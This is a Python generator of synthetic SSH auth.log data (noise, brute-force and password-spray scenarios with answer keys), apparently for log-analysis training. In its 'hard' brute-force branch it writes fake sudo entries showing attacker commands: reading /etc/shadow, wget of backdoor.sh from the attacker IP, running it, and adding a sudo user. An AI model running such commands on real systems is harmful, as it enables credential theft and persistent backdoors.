"""SSH auth.log generators — noise, bruteforce, and password spray."""
import random
import base64
import os
from datetime import datetime
from .config import (SSH_HOSTNAME, SSH_LEGIT_USERS, SSH_LEGIT_IPS, SSH_LEGIT_CLIENTS,
                     SSH_BRUTE_USERS, SSH_INVALID_USERS, SSH_ATTACKER_CLIENTS,
                     ATTACKER_IP_POOL, pick, pick_n, rand_between,
                     get_override, get_attacker_ips, format_auth_log_line)


def generate_ssh_noise(count, start_time, end_time):
    lines = []
    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    hostname = SSH_HOSTNAME
    generated = 0

    while generated < count:
        ts = random.randint(start_ts, end_ts)
        event_type = random.randint(1, 100)

        if event_type <= 30:
            user = pick(SSH_LEGIT_USERS)
            ip = pick(SSH_LEGIT_IPS)
            port = random.randint(40000, 65535)
            pid = random.randint(10000, 65000)
            dt = datetime.fromtimestamp(ts)

            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                    f'Connection from {ip} port {port} on 0.0.0.0 port 22 rdomain ""'),
            })
            generated += 1

            dt = datetime.fromtimestamp(ts + 1)
            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                    f'userauth-request for user {user} service ssh-connection method publickey [preauth]'),
            })
            generated += 1

            fingerprint = 'SHA256:' + base64.b64encode(os.urandom(32)).decode()[:43]
            dt = datetime.fromtimestamp(ts + 2)
            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                    f'Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 {fingerprint}'),
            })
            generated += 1

            uid = random.randint(1000, 5000)
            dt = datetime.fromtimestamp(ts + 3)
            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                    f'pam_unix(sshd:session): session opened for user {user}(uid={uid}) by {user}(uid=0)'),
            })
            generated += 1

            session_duration = random.randint(60, 3600)
            close_ts = ts + 3 + session_duration
            if close_ts <= end_ts:
                dt2 = datetime.fromtimestamp(close_ts)
                lines.append({
                    'timestamp': dt2,
                    'line': format_auth_log_line(dt2, hostname, 'sshd', pid,
                        f'pam_unix(sshd:session): session closed for user {user}'),
                })
                generated += 1

                lines.append({
                    'timestamp': dt2,
                    'line': format_auth_log_line(dt2, hostname, 'sshd', pid,
                        f'Received disconnect from {ip} port {port}:11: disconnected by user'),
                })
                generated += 1

        elif event_type <= 55:
            user = pick(['root', 'www-data', pick(SSH_LEGIT_USERS)])
            pid = random.randint(10000, 65000)
            uid = 0 if user == 'root' else random.randint(1000, 5000)
            dt = datetime.fromtimestamp(ts)

            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'CRON', pid,
                    f'pam_unix(cron:session): session opened for user {user}(uid={uid}) by {user}(uid=0)'),
            })
            generated += 1

            close_ts = ts + random.randint(1, 10)
            dt = datetime.fromtimestamp(close_ts)
            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'CRON', pid,
                    f'pam_unix(cron:session): session closed for user {user}'),
            })
            generated += 1

        elif event_type <= 75:
            user = pick(SSH_LEGIT_USERS)
            pid = random.randint(10000, 65000)
            sudo_cmds = [
                '/usr/bin/systemctl restart apache2',
                '/usr/bin/systemctl status mysql',
                '/usr/bin/apt update',
                '/usr/bin/tail -f /var/log/syslog',
                '/usr/bin/cat /etc/hosts',
                '/usr/bin/service nginx reload',
                '/bin/journalctl -u sshd --no-pager',
                '/usr/bin/certbot renew',
            ]
            tty_num = random.randint(0, 5)
            cmd = pick(sudo_cmds)
            dt = datetime.fromtimestamp(ts)

            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sudo', pid,
                    f'    {user} : TTY=pts/{tty_num} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}'),
            })
            generated += 1

            uid = random.randint(1000, 5000)
            dt = datetime.fromtimestamp(ts + 1)
            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sudo', pid,
                    f'pam_unix(sudo:session): session opened for user root(uid=0) by {user}(uid={uid})'),
            })
            generated += 1

        elif event_type <= 90:
            user = pick(SSH_LEGIT_USERS)
            pid = random.randint(500, 2000)
            session_id = random.randint(100, 9999)
            dt = datetime.fromtimestamp(ts)

            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'systemd-logind', pid,
                    f'New session {session_id} of user {user}.'),
            })
            generated += 1

        else:
            user = pick(SSH_LEGIT_USERS)
            ip = pick(SSH_LEGIT_IPS)
            port = random.randint(40000, 65535)
            pid = random.randint(10000, 65000)
            dt = datetime.fromtimestamp(ts)

            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                    f'Failed password for {user} from {ip} port {port} ssh2'),
            })
            generated += 1

            delay = random.randint(8, 30)
            dt = datetime.fromtimestamp(ts + delay)
            lines.append({
                'timestamp': dt,
                'line': format_auth_log_line(dt, hostname, 'sshd', pid + 1,
                    f'Accepted password for {user} from {ip} port {port + 1} ssh2'),
            })
            generated += 1

    return lines


def generate_ssh_bruteforce(attacker_count, difficulty, start_time, end_time, overrides=None):
    lines = []
    answers = {
        'type': 'SSH Bruteforce',
        'attacker_ips': [],
        'total_attempts_per_ip': {},
        'usernames_tried': [],
        'compromised_user': None,
        'success': [],
    }

    attacker_ips = get_attacker_ips(overrides, attacker_count)
    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    hostname = get_override(overrides, 'ssh_hostname', SSH_HOSTNAME)

    custom_brute_users = get_override(overrides, 'ssh_brute_users', None)
    all_users = (custom_brute_users if (custom_brute_users and isinstance(custom_brute_users, list))
                 else SSH_BRUTE_USERS)

    forced_compromised_user = get_override(overrides, 'ssh_compromised_user', None)
    answers['attacker_ips'] = attacker_ips

    # Users that exist on the server — never tagged as "invalid user" by sshd
    invalid_set = set(SSH_INVALID_USERS)
    valid_brute_users = [u for u in all_users if u not in invalid_set] or SSH_LEGIT_USERS

    attempt_ranges = {'easy': (80, 200), 'medium': (40, 100), 'hard': (15, 50)}
    delay_ranges = {'easy': (1, 3), 'medium': (2, 10), 'hard': (10, 60)}
    att_lo, att_hi = attempt_ranges.get(difficulty, (40, 100))
    del_lo, del_hi = delay_ranges.get(difficulty, (2, 10))

    for ip in attacker_ips:
        attempts = random.randint(att_lo, att_hi)
        answers['total_attempts_per_ip'][ip] = attempts
        attack_start = random.randint(start_ts, start_ts + int((end_ts - start_ts) * 0.4))
        current_ts = attack_start

        target_user = forced_compromised_user or pick(SSH_LEGIT_USERS)
        success_attempt = random.randint(int(attempts * 0.75), attempts - 1)
        usernames_tried = []

        for a in range(attempts):
            pid = random.randint(10000, 65000)
            port = random.randint(32768, 65535)
            dt = datetime.fromtimestamp(current_ts)
            is_success = (a == success_attempt)

            if is_success:
                user = target_user
                usernames_tried.append(user)

                lines.append({
                    'timestamp': dt,
                    'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                        f'Accepted password for {user} from {ip} port {port} ssh2'),
                })

                dt2 = datetime.fromtimestamp(current_ts + 1)
                uid = random.randint(1000, 5000)
                lines.append({
                    'timestamp': dt2,
                    'line': format_auth_log_line(dt2, hostname, 'sshd', pid,
                        f'pam_unix(sshd:session): session opened for user {user}(uid={uid}) by {user}(uid=0)'),
                })

                answers['compromised_user'] = user
                answers['success'].append({'ip': ip, 'user': user, 'attempt_number': a + 1})

                if difficulty == 'hard':
                    post_ts = current_ts + random.randint(10, 60)
                    dt_post = datetime.fromtimestamp(post_ts)
                    sudo_pid = random.randint(10000, 65000)

                    lines.append({
                        'timestamp': dt_post,
                        'line': format_auth_log_line(dt_post, hostname, 'sudo', sudo_pid,
                            f'    {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow'),
                    })

                    dt_post = datetime.fromtimestamp(dt_post.timestamp() + random.randint(5, 20))
                    lines.append({
                        'timestamp': dt_post,
                        'line': format_auth_log_line(dt_post, hostname, 'sudo', sudo_pid,
                            f'    {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/wget http://{ip}/backdoor.sh -O /tmp/.bd.sh'),
                    })

                    dt_post = datetime.fromtimestamp(dt_post.timestamp() + random.randint(3, 10))
                    lines.append({
                        'timestamp': dt_post,
                        'line': format_auth_log_line(dt_post, hostname, 'sudo', sudo_pid,
                            f'    {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash /tmp/.bd.sh'),
                    })

                    dt_post = datetime.fromtimestamp(dt_post.timestamp() + random.randint(5, 15))
                    lines.append({
                        'timestamp': dt_post,
                        'line': format_auth_log_line(dt_post, hostname, 'sudo', sudo_pid + 1,
                            f'    {user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo svc_update'),
                    })

            else:
                if random.randint(1, 3) == 1:
                    user = pick(SSH_INVALID_USERS)
                    usernames_tried.append(user)

                    lines.append({
                        'timestamp': dt,
                        'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                            f'Invalid user {user} from {ip} port {port}'),
                    })

                    dt2 = datetime.fromtimestamp(current_ts + 1)
                    lines.append({
                        'timestamp': dt2,
                        'line': format_auth_log_line(dt2, hostname, 'sshd', pid,
                            'pam_unix(sshd:auth): check pass; user unknown'),
                    })

                    dt3 = datetime.fromtimestamp(current_ts + 2)
                    lines.append({
                        'timestamp': dt3,
                        'line': format_auth_log_line(dt3, hostname, 'sshd', pid,
                            f'Failed password for invalid user {user} from {ip} port {port} ssh2'),
                    })
                    dt = dt3
                else:
                    user = pick(valid_brute_users)
                    usernames_tried.append(user)

                    lines.append({
                        'timestamp': dt,
                        'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                            f'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}'),
                    })

                    dt = datetime.fromtimestamp(current_ts + 2)
                    lines.append({
                        'timestamp': dt,
                        'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                            f'Failed password for {user} from {ip} port {port} ssh2'),
                    })

                dt_disc = datetime.fromtimestamp(dt.timestamp() + 1)
                disconnect_msgs = [
                    f'Connection closed by authenticating user {user} {ip} port {port} [preauth]',
                    f'Disconnected from authenticating user {user} {ip} port {port} [preauth]',
                    f'Connection reset by {ip} port {port} [preauth]',
                ]
                lines.append({
                    'timestamp': dt_disc,
                    'line': format_auth_log_line(dt_disc, hostname, 'sshd', pid, pick(disconnect_msgs)),
                })

            if random.randint(1, 8) == 1:
                dt_max = datetime.fromtimestamp(current_ts + 2)
                lines.append({
                    'timestamp': dt_max,
                    'line': format_auth_log_line(dt_max, hostname, 'sshd', pid,
                        f'error: maximum authentication attempts exceeded for {user} from {ip} port {port} ssh2 [preauth]'),
                })
                dt_max2 = datetime.fromtimestamp(current_ts + 3)
                lines.append({
                    'timestamp': dt_max2,
                    'line': format_auth_log_line(dt_max2, hostname, 'sshd', pid,
                        f'Disconnecting authenticating user {user} {ip} port {port}: Too many authentication failures [preauth]'),
                })

            delay = random.randint(del_lo, del_hi)
            if difficulty == 'easy' and random.randint(1, 3) == 1:
                delay = 0
            current_ts += delay

        answers['usernames_tried'] = list(dict.fromkeys(answers['usernames_tried'] + usernames_tried))

    return {'lines': lines, 'answers': answers}


def generate_ssh_spray(attacker_count, difficulty, start_time, end_time, overrides=None):
    lines = []
    answers = {
        'type': 'SSH Password Spray',
        'attacker_ips': [],
        'total_attempts_per_ip': {},
        'usernames_targeted': [],
        'compromised_user': None,
        'success': [],
    }

    attacker_ips = get_attacker_ips(overrides, attacker_count)
    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    hostname = SSH_HOSTNAME
    answers['attacker_ips'] = attacker_ips

    spray_users = SSH_BRUTE_USERS[:random.randint(8, 15)]
    answers['usernames_targeted'] = spray_users

    round_counts = {'easy': (5, 10), 'medium': (3, 6), 'hard': (2, 4)}
    lo, hi = round_counts.get(difficulty, (3, 6))
    round_count = random.randint(lo, hi)

    round_delays = {'easy': (30, 120), 'medium': (120, 600), 'hard': (600, 1800)}
    rlo, rhi = round_delays.get(difficulty, (120, 600))

    for ip in attacker_ips:
        current_ts = random.randint(start_ts, start_ts + int((end_ts - start_ts) * 0.3))
        total_attempts = 0

        success_round = round_count - 1
        success_user_idx = random.randint(0, len(spray_users) - 1)

        for round_idx in range(round_count):
            for u_idx, user in enumerate(spray_users):
                pid = random.randint(10000, 65000)
                port = random.randint(32768, 65535)
                dt = datetime.fromtimestamp(current_ts)
                is_success = (round_idx == success_round and u_idx == success_user_idx)
                is_valid = user in SSH_LEGIT_USERS

                if is_success:
                    lines.append({
                        'timestamp': dt,
                        'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                            f'Accepted password for {user} from {ip} port {port} ssh2'),
                    })
                    answers['compromised_user'] = user
                    answers['success'].append({'ip': ip, 'user': user, 'round': round_idx + 1})
                else:
                    if not is_valid:
                        lines.append({
                            'timestamp': dt,
                            'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                                f'Invalid user {user} from {ip} port {port}'),
                        })
                        dt2 = datetime.fromtimestamp(current_ts + 1)
                        lines.append({
                            'timestamp': dt2,
                            'line': format_auth_log_line(dt2, hostname, 'sshd', pid,
                                f'Failed password for invalid user {user} from {ip} port {port} ssh2'),
                        })
                    else:
                        lines.append({
                            'timestamp': dt,
                            'line': format_auth_log_line(dt, hostname, 'sshd', pid,
                                f'Failed password for {user} from {ip} port {port} ssh2'),
                        })

                    dt_close = datetime.fromtimestamp(current_ts + 1)
                    lines.append({
                        'timestamp': dt_close,
                        'line': format_auth_log_line(dt_close, hostname, 'sshd', pid,
                            f'Connection closed by authenticating user {user} {ip} port {port} [preauth]'),
                    })

                total_attempts += 1
                current_ts += random.randint(2, 10)

            current_ts += random.randint(rlo, rhi)

        answers['total_attempts_per_ip'][ip] = total_attempts

    return {'lines': lines, 'answers': answers}
